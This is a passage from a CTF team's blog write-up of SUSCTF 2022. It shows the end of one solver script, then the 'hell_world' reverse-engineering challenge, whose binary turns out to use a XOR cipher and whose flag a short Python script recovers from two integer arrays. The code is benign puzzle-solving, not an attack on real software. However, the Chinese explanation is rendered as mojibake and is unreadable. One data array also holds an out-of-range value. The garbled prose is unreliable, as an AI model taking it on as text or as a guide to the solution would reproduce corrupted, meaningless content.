</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>L</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>%</span> <span class=mi>23</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>li</span> <span class=o>=</span> <span class=p>(</span><span class=n>L</span><span class=p>[</span><span class=n>pi</span><span class=p>]</span> <span class=o>-</span> <span class=n>cr</span><span class=p>)</span> <span class=o>//</span> <span class=mi>23</span>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=n>li</span><span class=o>&gt;</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>priority</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>priority</span><span class=p>[</span><span class=n>li</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>np</span> <span class=o>=</span> <span class=n>go</span><span class=p>(</span><span class=n>li</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=n>np</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>go</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mi>31</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>did</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>ans</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2022-2-28-SUSCTF/1.jpg alt=img></p><h2 id=hell_world>hell_world</h2><p>è·Ÿè¥¿æ¹–è®ºå‰‘é¢˜ç›®gghdlå·®ä¸å¤š å°±æ˜¯æ”¹äº†ä¸‹caseç»“æ„å’Œæ•°æ®å¯ä»¥æ ¹æ®<a href=http://blog.bluesadi.cn/2021/11/24/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91gghdl%E9%A2%98%E8%A7%A3/>é“¾æ¥</a>æ¥è§£é¢˜
ä»å­—ç¬¦ä¸²æœç´¢å…³é”®ç‚¹
<img src=/img/2022-2-28-SUSCTF/20220301005626448.jpg alt=img>
ä¹‹åå°±æ˜¯æ…¢æ…¢è§£ææ¯ä¸ªcaseçš„ä½œç”¨
æ¯”å¦‚case7æ˜¯ä¸€ä¸ªå¾ªç¯çš„åˆ¤æ–­æ¡ä»¶ï¼Œcase11æ˜¯å•å­—èŠ‚æ¯”è¾ƒåˆ†æ”¯ã€‚
ä¹‹åæ…¢æ…¢è°ƒè¯•ä¸€éæµç¨‹å å‘ç°case11æ¡ä»¶é‡Œé¢çš„sub_140009CC0å‡½æ•°ä¸é“¾æ¥å‡½æ•°ä¸€æ ·
æ‰€ä»¥è¿›è¡Œè°ƒè¯•å‘ç° è¿™ä¸ªç®—æ³•å…¶å®å°±æ˜¯ä¸€ä¸ªå¼‚æˆ–ç®—æ³•
<img src=/img/2022-2-28-SUSCTF/20220301005626545.jpg alt=img>
<img src=/img/2022-2-28-SUSCTF/20220301005626508.jpg alt=img>
ä¸Šé¢çš„v74ä¸v71æ˜¯æ˜¯è¾“å…¥çš„åŠ å¯†ç»“æœå’Œå¯†æ–‡ï¼Œå¯†æ–‡å°±åœ¨æœ¬åˆ†æ”¯çš„dword_1400F5B80[]æ•°ç»„
è€Œä¸”è°ƒè¯•å‘ç° å…¶å®åŠ å¯†ä¹‹åçš„(2ï¼Œ3 å…¶å®è¡¨ç¤ºçš„å°±æ˜¯äºŒè¿›åˆ¶çš„ 0 ï¼Œ1)
è¿›è€Œå‘ç°å…¶å®å°±æ˜¯å¼‚æˆ–åŠ å¯†
å¼‚æˆ–çš„æ•°æ®åœ¨case10åˆ†æ”¯çš„dword_1400F5C50æ•°ç»„å½“ä¸­</p><h3 id=exp>exp</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>data1</span> <span class=o>=</span> <span class=p>[</span><span class=mi>86</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>218</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>205</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>58</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>126</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>134</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>19</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>181</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>29</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>157</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>252</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>151</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>140</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>49</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>107</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>201</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>251</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>26</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>226</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>45</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>220</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>211</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>241</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>244</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>54</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>9</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>32</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>66</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>4</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>106</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>113</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>83</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>120</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>164</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>151</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>143</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>122</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>114</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>57</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>232</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>61</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>250</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>64</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>61</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>408</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>data2</span> <span class=o>=</span> <span class=p>[</span><span class=mi>5</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>143</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>158</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>121</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>42</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>192</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>104</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>129</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>45</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>252</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>207</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>164</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>181</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>85</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>95</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>228</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>157</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>35</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>214</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>29</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>241</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>231</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>151</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>145</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>6</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>36</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>66</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>113</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>60</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>88</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>92</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>48</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>25</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>198</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>245</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>188</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>75</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>66</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>93</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>218</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>88</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>155</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>36</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>64</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data2</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>data1</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>data2</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/susctf/>SUSCTF</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/rwctf-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 RWCTFä½“éªŒèµ› SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/actf-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 ACTF SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>